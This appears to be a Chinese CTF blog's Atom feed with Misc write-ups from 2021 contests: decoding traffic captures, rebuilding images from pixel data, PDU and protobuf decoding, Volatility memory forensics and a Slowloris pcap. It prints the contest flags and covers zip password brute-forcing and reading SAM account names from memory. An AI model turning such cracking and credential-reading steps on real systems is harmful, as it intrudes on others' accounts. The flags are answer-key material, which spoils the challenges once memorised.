<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The blog of mklkx</title>
  <icon>https://www.gravatar.com/avatar/6304657417bd40e9a3c6f5c53a19ef73</icon>
  
  <link href="http://mklkx.github.io/atom.xml" rel="self"/>
  
  <link href="http://mklkx.github.io/"/>
  <updated>2021-05-18T02:28:06.588Z</updated>
  <id>http://mklkx.github.io/</id>
  
  <author>
    <name>煤矿路口西</name>
    <email>mklkx_yep@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021CISCN</title>
    <link href="http://mklkx.github.io/2021/05/18/2021CISCN/"/>
    <id>http://mklkx.github.io/2021/05/18/2021CISCN/</id>
    <published>2021-05-18T02:06:21.000Z</published>
    <updated>2021-05-18T02:28:06.588Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="2021ciscn-misc">2021CISCN-Misc</span></h1><hr><h2><span id="tiny-traffic">tiny traffic</span></h2><p>流量包导出http对象得到一堆文件</p><p>其中【test】和【secret】似乎有点东西</p><p>但直接打开为乱码</p><p>考虑br解码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import brotli</span><br><span class="line">f &#x3D; open(&#39;secret&#39;,&#39;rb&#39;).read()</span><br><span class="line">print(f)</span><br><span class="line">c &#x3D; brotli.decompress(f)</span><br><span class="line">print(c)</span><br><span class="line">#b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;</span><br></pre></td></tr></table></figure><p>以上是解码后的【secret】内容，猜测为flag</p><p>【test】</p><p><img src="ciscn1.png" alt="1"></p><p>根据内容搜索得到https://blog.csdn.net/u013210620/article/details/81317731</p><p>安装好后，将test后缀改为.proto</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protoc test.proto  --python_out&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>解决报错https://blog.csdn.net/qq_27563511/article/details/80696403</p><p><img src="ciscn2.png" alt="2"></p><p>得到test_pb2.py</p><p>编写代码，</p><p>调用这个库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import test_pb2</span><br><span class="line"></span><br><span class="line">flag_pb &#x3D; test_pb2.PBResponse()</span><br><span class="line">flag_pb.ParseFromString(b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;)</span><br><span class="line">print(flag_pb)</span><br></pre></td></tr></table></figure><p><img src="ciscn3.png" alt="3"></p><p>按要求拼接得到</p><p><strong>CISCN{e66a22e23457889b0fb1146d172a38dc}</strong></p><h2><span id="running_pixel">running_pixel</span></h2><p>gif动图分离得到382张png</p><p>观察得它们中存在统一RGB值为(233,233,233)的色块</p><p>提取出他们的坐标值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">from PIL import Image</span><br><span class="line">for k in range(0,382):#张数</span><br><span class="line">    im &#x3D; Image.open(&#39;Frame%d.png&#39;%k)</span><br><span class="line">    # print(im.size[0])</span><br><span class="line">    # print(im.size[1])</span><br><span class="line">    for i in range(0,400):</span><br><span class="line">        for j in range(0,400):</span><br><span class="line">            #print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">            # print(im.getpixel((i, j)))</span><br><span class="line">            if(im.getpixel((i, j))&#x3D;&#x3D;(233, 233, 233, 255)):</span><br><span class="line">                # print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">                print(i,j)</span><br><span class="line">                #print(im.getpixel((i,j)))</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p>保存到xy.txt中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">file &#x3D; open(&quot;xy.txt&quot;, &quot;r&quot;)</span><br><span class="line">text &#x3D; file.readlines()[0]</span><br><span class="line">ch &#x3D; text.split(&quot; &quot;)</span><br><span class="line">print(ch)</span><br><span class="line">x &#x3D; []</span><br><span class="line">y &#x3D; []</span><br><span class="line">for i in ch:</span><br><span class="line">   x.append(i.split(&#39;,&#39;)[0])</span><br><span class="line">   y.append(i.split(&#39;,&#39;)[1])</span><br><span class="line">#print(x)</span><br><span class="line">print(len(x))</span><br><span class="line">for k in range(len(x)):</span><br><span class="line">   print(k)</span><br><span class="line">   img.putpixel((int(y[k]),int(x[k])),(233,233,233))</span><br><span class="line">   img.save(&quot;test%d.png&quot;%k)</span><br></pre></td></tr></table></figure><p>读取坐标值数据并写在对应位置上</p><p><img src="ciscn4.png" alt="4"></p><p>flag的顺序为数字依次出现的数据</p><p><strong>CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}</strong></p><h2><span id="隔空传话">隔空传话</span></h2><p>pdu编码</p><p>首先进行数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">b &#x3D; []</span><br><span class="line">d &#x3D; []</span><br><span class="line">e &#x3D; []</span><br><span class="line">a &#x3D; open(&#39;data.txt&#39;)</span><br><span class="line">for i in a:</span><br><span class="line">    b.append(i[34:46])</span><br><span class="line"># print(b)</span><br><span class="line"></span><br><span class="line">for i in b:</span><br><span class="line">    # print(i)</span><br><span class="line">    # c &#x3D; i[::2]</span><br><span class="line">    # print(c)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    d.append(c)</span><br><span class="line">d &#x3D; sorted(d)</span><br><span class="line"># print(d)</span><br><span class="line">#  此时d为已经排序好的顺序</span><br><span class="line">for i in d:</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    e.append(c)</span><br><span class="line"># print(e)</span><br><span class="line">file_handle&#x3D;open(&#39;dnm.txt&#39;,mode&#x3D;&#39;w&#39;)</span><br><span class="line">for i in range(616):</span><br><span class="line">    woc &#x3D; 0</span><br><span class="line">    c &#x3D; (&quot;调转前:&#123;&#125; |调转后: &#123;&#125; \n&quot;.format(d[woc],e[woc]))</span><br><span class="line">    file_handle.write(c)</span><br><span class="line">    woc+&#x3D;1</span><br><span class="line"># e &#x3D; sorted(e)</span><br><span class="line">#</span><br><span class="line"># for i in d:</span><br><span class="line">#     file_handle.write(&quot;&#123;&#125;\n &quot;.format(i))</span><br><span class="line">#     print(i)</span><br><span class="line"># file2 &#x3D; open(&#39;dnm.txt&#39;)</span><br><span class="line">#</span><br><span class="line"># step &#x3D; 0 #计数器</span><br><span class="line"># for i in file2:</span><br><span class="line">#     print(&quot;调转后:&#123;&#125;  调转前:&#123;&#125;&quot;.format(i,e[step]))</span><br><span class="line">#     step +&#x3D; 1</span><br></pre></td></tr></table></figure><p><img src="ciscn5.png" alt="5"></p><p>得到类似210425194359的，按照年月日时分秒排列的数据</p><p>经过手动匹配后，pdu解码</p><p><a href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/</a></p><p>补充前后关键数据如下：</p><p><img src="ciscn6.png" alt="6"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the first part of the flag is the first 8 digits of your phone number </span><br><span class="line">那其他部分呢 </span><br><span class="line">看看你能从这些数据里发现什么？w465</span><br></pre></td></tr></table></figure><p>拼合数据得到png</p><p><img src="ciscn7.png" alt="7"></p><p>贴进010后</p><p>png根据crc32爆破长宽</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc &#x3D; open(&quot;Untitled1.png&quot;, &quot;rb&quot;).read()</span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:16] + struct.pack(&#39;&gt;i&#39;, i) + misc[20:29]  # IHDR数据</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:  # IHDR块的crc32值</span><br><span class="line">        print(&#39;weight&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># 爆破高</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:20] + struct.pack(&#39;&gt;i&#39;, i) + misc[24:29]</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:</span><br><span class="line">        print(&#39;height&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># weight</span><br><span class="line"># 465</span><br><span class="line"># hex:0x1d1</span><br></pre></td></tr></table></figure><p><img src="ciscn8.png" alt="8"></p><p><strong>CISCN{15030442_b586_4c9e_b436_26def12293e4}</strong></p><h2><span id="robot">robot</span></h2><p>给了一个pcapng流</p><p>通过追踪tcp流</p><p>发现【Value.[36,35,0]】字样</p><p>疑似坐标</p><p>通过数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">with open(&#39;.&#x2F;tcp.txt&#39;,&#39;r&#39;,encoding&#x3D;&quot;utf-8&quot;) as f:</span><br><span class="line">    text &#x3D; f.read()</span><br><span class="line">    p1 &#x3D; re.compile(r&#39;Value\.\[\d+,\d+,-?\d+\.*\d*\]&#39;)</span><br><span class="line">    data &#x3D; (re.findall(p1, text))</span><br><span class="line"></span><br><span class="line">    with open(&#39;data.txt&#39;,&#39;w&#39;,encoding&#x3D;&quot;utf-8&quot;) as l:</span><br><span class="line">        l.write(str(data))</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="ciscn9.png" alt="9"></p><p>经过处理，参考前卷代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">mark&#x3D;[(27,36),(28,35),(29,35),(31,35),(32,35),(33,35),(35,35),(36,35),(37,35),(39,34),(40,34),(41,33),(42,32),(43,32),(45,32),(47,31),(48,29),(49,28),(49,27),(50,26),(50,25),(51,23),(51,22),(51,21),(52,20),(52,19),(52,18),(52,17),(52,16),(52,15),(51,14),(50,14),(49,14),(48,14),(47,14),(46,14),(45,14),(44,14),(43,14),(42,14),(40,14),(39,14),(37,14),(35,14),(34,14),(32,14),(30,14),(28,14),(27,14),(26,14),(25,14),(24,14),(23,14),(22,14),(21,15),(20,16),(19,17),(18,19),(18,21),(18,22),(18,23),(18,24),(18,26),(18,27),(18,28),(18,30),(18,32),(18,33),(18,34),(19,37),(21,39),(21,40),(22,42),(24,44),(24,45),(26,47),(27,48),(28,49),(29,50),(30,51),(31,52),(33,53),(34,53),(35,54),(36,54),(37,54),(38,54),(39,54),(40,54),(41,54),(44,54),(46,54),(48,54),(50,54),(52,53),(53,53),(54,52),(55,52),(56,52),(58,51),(59,50),(61,49),(62,49),(64,47),(65,47),(67,46),(68,46),(70,45),(71,44),(71,44,-10),(125,23),(125,23),(124,22),(123,22),(121,21),(118,20),(115,19),(113,19),(112,18),(111,18),(109,17),(106,16),(104,16),(103,16),(102,15),(101,15),(100,15),(99,15),(98,15),(97,15),(96,15),(95,15),(94,15),(93,15),(92,15),(91,15),(89,15),(87,17),(85,18),(85,19),(84,21),(83,21),(82,22),(82,23),(81,24),(81,26),(80,28),(80,29),(80,31),(80,32),(79,34),(79,35),(79,37),(79,39),(79,41),(79,43),(79,44),(79,46),(79,47),(80,48),(81,49),(82,50),(84,50),(87,51),(88,51),(90,51),(91,51),(93,51),(94,51),(97,51),(100,50),(101,49),(102,49),(103,48),(105,46),(106,45),(108,43),(109,42),(110,41),(111,39),(112,38),(112,36),(113,34),(114,33),(115,32),(115,31),(116,30),(117,28),(118,27),(118,28),(117,30),(116,32),(115,34),(115,36),(114,39),(114,41),(114,43),(114,45),(114,47),(114,48),(114,50),(114,52),(114,53),(115,54),(116,55),(117,56),(118,57),(120,57),(122,57),(124,57),(126,57),(128,57),(131,57),(133,57),(136,57),(138,57),(141,57),(143,56),(145,55),(147,53),(149,52),(150,52),(152,50),(153,49),(155,47),(156,46),(157,45),(157,45,-10),(212,24),(212,24),(213,23),(211,21),(210,20),(209,19),(208,18),(207,17),(206,16),(205,15),(204,15),(201,14),(200,14),(199,14),(197,14),(196,14),(195,14),(193,14),(191,14),(189,16),(188,16),(187,16),(186,17),(185,17),(183,18),(183,20),(183,21),(182,22),(182,23),(182,24),(182,25),(182,26),(182,27),(182,29),(183,31),(184,32),(186,33),(187,34),(188,34),(189,35),(190,35),(192,36),(194,37),(196,37),(198,38),(199,38),(200,38),(201,38),(202,39),(203,39),(204,40),(207,41),(207,42),(208,43),(208,44),(208,45),(208,46),(208,48),(208,50),(208,51),(207,53),(207,54),(206,56),(204,58),(203,60),(202,61),(201,62),(201,63),(200,64),(199,64),(198,64),(197,65),(196,65),(195,65),(193,65),(192,65),(190,65),(189,65),(187,65),(185,65),(184,65),(183,65),(181,64),(180,63),(179,63),(178,62),(177,62),(175,61),(174,60),(173,59),(173,59,-10),(243,20),(243,20),(244,19),(244,21),(244,25),(245,26),(245,29),(247,32),(247,34),(248,36),(248,37),(249,39),(250,40),(251,42),(251,43),(252,44),(254,44),(256,44),(258,44),(260,42),(262,41),(263,40),(265,38),(266,35),(267,32),(268,30),(271,27),(272,25),(273,22),(274,21),(275,20),(275,19),(274,18),(274,20),(272,22),(271,23),(271,26),(268,29),(266,33),(266,35),(265,37),(263,40),(262,42),(262,44),(261,47),(260,49),(259,51),(258,55),(258,56),(257,58),(255,61),(254,62),(253,63),(253,64),(252,65),(251,66),(250,67),(249,68),(248,69),(247,70),(246,71),(245,72),(244,73),(244,73,-10),(298,64),(298,64),(299,65),(300,65),(302,65),(304,65),(306,65),(308,65),(309,65),(312,65),(315,65),(317,65),(319,65),(322,65),(325,65),(327,65),(330,65),(332,65),(334,66),(335,66),(335,66,-10),(20,103),(20,104),(20,107),(20,110),(20,112),(20,114),(20,118),(19,121),(18,124),(17,126),(17,130),(17,134),(17,137),(17,139),(17,142),(17,143),(17,146),(17,147),(17,149),(17,150),(17,149),(17,148),(17,146),(18,145),(18,143),(19,142),(20,141),(20,140),(21,138),(21,137),(22,135),(23,134),(24,132),(25,131),(26,129),(27,128),(28,127),(29,126),(31,125),(32,124),(32,123),(34,121),(35,120),(37,120),(38,119),(40,118),(41,118),(43,117),(44,116),(46,115),(48,115),(49,114),(50,113),(51,113),(52,112),(52,112,-10),(80,121),(80,121),(79,120),(78,121),(77,122),(77,123),(77,124),(76,127),(75,128),(74,129),(73,131),(73,132),(73,133),(72,135),(72,136),(72,137),(72,138),(72,139),(72,140),(72,142),(72,144),(72,145),(73,148),(74,149),(77,150),(78,150),(80,151),(81,151),(82,151),(83,151),(84,151),(85,151),(87,151),(89,151),(90,151),(92,150),(93,150),(95,149),(97,147),(98,146),(99,146),(100,145),(101,144),(102,142),(102,141),(104,139),(104,138),(105,136),(105,135),(105,133),(105,132),(105,131),(105,129),(104,128),(103,126),(102,126),(101,125),(98,123),(96,123),(95,123),(93,123),(92,122),(90,121),(89,121),(86,120),(86,120,-10),(147,98),(147,98),(146,99),(145,100),(144,103),(143,104),(142,105),(142,106),(142,109),(142,111),(142,114),(141,118),(140,120),(139,123),(138,127),(138,129),(137,133),(135,135),(134,137),(133,139),(131,142),(131,143),(131,145),(130,146),(129,149),(128,152),(128,153),(127,156),(127,157),(126,158),(127,157),(129,157),(130,156),(132,156),(134,155),(137,153),(138,152),(139,151),(140,150),(143,149),(144,148),(145,147),(146,146),(147,145),(149,144),(149,143),(150,142),(151,141),(152,140),(152,139),(153,138),(153,137),(153,136),(153,135),(153,134),(153,133),(152,132),(151,131),(150,131),(149,130),(147,129),(147,129,-10),(186,136),(186,136),(183,137),(182,138),(182,139),(182,140),(181,142),(179,144),(179,145),(179,147),(178,149),(177,150),(177,151),(177,152),(177,154),(177,156),(177,157),(177,158),(178,160),(179,161),(180,162),(181,163),(182,164),(184,164),(186,164),(187,164),(188,164),(190,163),(191,162),(192,162),(194,160),(196,159),(197,158),(197,156),(198,155),(200,153),(200,152),(201,150),(201,149),(201,148),(201,147),(201,145),(201,144),(201,142),(201,141),(201,139),(201,138),(200,136),(199,135),(198,135),(197,135),(196,135),(195,135),(193,135),(192,135),(190,135),(189,135),(189,135,-10),(223,167),(223,167),(224,167),(226,167),(228,167),(229,167),(232,167),(233,167),(234,167),(235,167),(237,167),(238,167),(240,167),(241,167),(243,167),(244,167),(246,167),(247,167),(250,168),(251,168),(252,168),(253,168),(254,168),(254,168,-10),(269,135),(271,136),(273,138),(275,140),(276,141),(278,143),(280,145),(282,147),(284,149),(285,150),(288,152),(289,153),(291,154),(293,156),(294,157),(296,159),(297,160),(298,161),(299,162),(299,162,-10),(300,136),(299,136),(297,137),(296,138),(294,141),(294,142),(293,144),(293,145),(292,148),(291,149),(290,151),(288,153),(288,155),(287,156),(286,157),(285,159),(284,160),(283,161),(282,162),(281,163),(280,164),(279,165),(279,165,-10),(327,142),(328,143),(330,145),(332,148),(333,149),(335,151),(337,154),(339,156),(341,158),(342,159),(345,160),(347,161),(348,162),(350,164),(351,165),(352,166),(355,168),(356,169),(356,169,-10),(351,143),(350,143),(348,144),(347,144),(346,145),(343,148),(341,150),(339,152),(336,155),(333,158),(330,159),(327,162),(325,165),(323,167),(322,168),(319,170),(317,171),(316,171),(314,172),(313,172),(313,172)]</span><br><span class="line">print(mark[0])</span><br><span class="line">for j in range(len(mark)):</span><br><span class="line">    for i in range(len(mark)):</span><br><span class="line">        img.putpixel((list(mark[i])[0], list(mark[i])[1]), (255, 255, 255))</span><br><span class="line">img.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="ciscn10.png" alt="10"></p><p>md5加密</p><p><strong>CISCN{d4f1fb80bc11ffd722861367747c0f10}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;2021ciscn-misc&quot;&gt;2021CISCN-Misc&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;tiny-traffic&quot;&gt;tiny traffic&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;流量包导出http对象得到一堆文件&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021红帽杯</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/</id>
    <published>2021-05-11T06:31:40.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021红帽杯">2021红帽杯</span></h3><hr><h4><span id="签到">签到</span></h4><p>根据文件名提示，</p><p>把txt拖进010editor，</p><p>更改编码方式为【EBCDIC】</p><p>flag{we1c0me_t0_redhat2021}</p><h4><span id="colorful-code">colorful code</span></h4><p>附件得到两个data</p><p>一个全是数字，一个是十六进制</p><p>结合题目【colorful】</p><p>猜测为图片隐写</p><p>1）如何形成图片data2开头为【000000】</p><p><img src="1.png" alt="1"></p><p>猜测为RGB，相当于字典</p><p>而data1为索引值，数字对应data2中的第几组数据。</p><p>接下来是长宽的问题</p><p>尝试了很多方式，</p><p>发现data1的长度为7068，微调后发现【7067=37*191】</p><p>脚本如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im &#x3D; open(&quot;data1&quot;,&quot;r&quot;)</span><br><span class="line">mark &#x3D; im.readline().split(&#39; &#39;)</span><br><span class="line">print(mark)</span><br><span class="line">print(len(mark))</span><br><span class="line">c &#x3D; [(0,0,0),(0,0,192),(0,255,255),(0,255,0),(255,192,255),(255,192,192),(192,192,255),(192,192,0),(255,0,255),(255,0,0),(192,0,0),(192,0,192),(255,255,255),(255,255,0),(255,255,192),(0,192,0),(0,192,192),(192,255,255),(192,255,192),(0,0,255)]</span><br><span class="line">pic &#x3D; Image.new(&quot;RGB&quot;,(37,191))</span><br><span class="line">k&#x3D;0</span><br><span class="line">for i in range(37):</span><br><span class="line">    for j in range(191):</span><br><span class="line">        pic.putpixel((int(i),int(j)),c[int(mark[k])])</span><br><span class="line">        k +&#x3D; 1</span><br><span class="line">pic.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到png</p><p><img src="2.png" alt="2"></p><p>找到解密网站https://www.bertnase.de/npiet/npiet-execute.php</p><p>得到flag</p><p><img src="3.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">88842f20-fb8c-45c9-ae8f-36135b6a0f11</span><br></pre></td></tr></table></figure><p>加flag头上交</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021红帽杯&quot;&gt;2021红帽杯&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;签到&quot;&gt;签到&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;根据文件名提示，&lt;/p&gt;
&lt;p&gt;把txt拖进010editor，&lt;/p&gt;
&lt;p&gt;更改编码方式为【EBCDIC】&lt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021年第六届全国网络空间安全技术大赛Misc</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/</id>
    <published>2021-05-11T06:15:21.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021年第六届全国网络空间安全技术大赛misc">2021年第六届全国网络空间安全技术大赛Misc</span></h3><hr><h4><span id="rgb">RGB</span></h4><p>一共得到28864行RGB数据，</p><p>通过不断尝试分解64 x 11 x 41</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">x &#x3D; 176</span><br><span class="line">y &#x3D; 164</span><br><span class="line">img &#x3D; Image.new(&#39;RGB&#39;,(x,y))</span><br><span class="line">file &#x3D; open(&#39;R#G#B.txt&#39;, &#39;r&#39;)</span><br><span class="line">for width in range(0,x):</span><br><span class="line">    for height in range(0,y):</span><br><span class="line">        line &#x3D; file.readline()</span><br><span class="line">        print line</span><br><span class="line">        rgb &#x3D; line.split(&#39;#&#39;)</span><br><span class="line">        print rgb</span><br><span class="line">        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line">img.save(&#39;rgb1.jpg&#39;)</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><p>水平翻转得到flag{c1d836d1db9d42dd}</p><h4><span id="zip">zip</span></h4><p>压缩包ARCHPR爆破得到密码【ff123】</p><p>得到【readme.txt】</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">培根密码</span><br><span class="line">BABBBBBAAAABAAB</span><br><span class="line"># XYJ</span><br><span class="line"># xyj</span><br></pre></td></tr></table></figure><p>【文章.docx】解密后</p><p><img src="2.png" alt="2"></p><p>全选上色</p><p>得到flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}</p><h4><span id="memory_1">Memory_1</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看可能版本 </span><br><span class="line">volatility -f mal.vmem imageinfo </span><br><span class="line"># 查看进程 </span><br><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p>观察时间规律，发现曾经打开cmd</p><p><img src="3.png" alt="3"></p><p>然而</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p>只能看到ipconfig</p><p>发现文章https://wiki.wgpsec.org/knowledge/ctf/Volatility.html</p><p>尝试查看cmd的详细历史命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p>经过多次尝试，确定病毒名为</p><p><img src="4.png" alt="4"></p><p>flag{24060da3d327991115a96e7099da25c3}</p><h4><span id="memory_2">Memory_2</span></h4><p>看一下用户信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><p><img src="6.png" alt="6"></p><p><img src="7.png" alt="7"></p><p>在最后发现可疑net1.exe，</p><p>flag{45321c07f425d915c55424957353dd07}</p><h4><span id="slowloris">Slowloris</span></h4><p>1)小白做法为，</p><p>统计-》流量图-》遍历所有ip</p><p><img src="8.png" alt="8"></p><p>md5加密</p><p>slowloris/195.8.178.227</p><p>得到flag</p><p>flag{3fc9d4a929cb690728d2b76c76483abe}</p><p>2)一般做法为：Slowloris攻击为大流量攻击，通过流量包查看哪两个ip之间有频繁交互即可锁定</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021年第六届全国网络空间安全技术大赛misc&quot;&gt;2021年第六届全国网络空间安全技术大赛Misc&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;rgb&quot;&gt;RGB&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;一共得到28864行RGB数据，&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021</title>
    <link href="http://mklkx.github.io/2021/05/04/ISCC2021/"/>
    <id>http://mklkx.github.io/2021/05/04/ISCC2021/</id>
    <published>2021-05-04T11:31:22.000Z</published>
    <updated>2021-05-10T08:43:40.683Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="08f6d82129eac9a87182df6ea6d26380de20c6bbee4cd1719a302b1d404e2b38"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021第五届蓝帽杯初赛</title>
    <link href="http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2021-05-04T02:29:08.000Z</published>
    <updated>2021-05-04T11:39:55.631Z</updated>
    
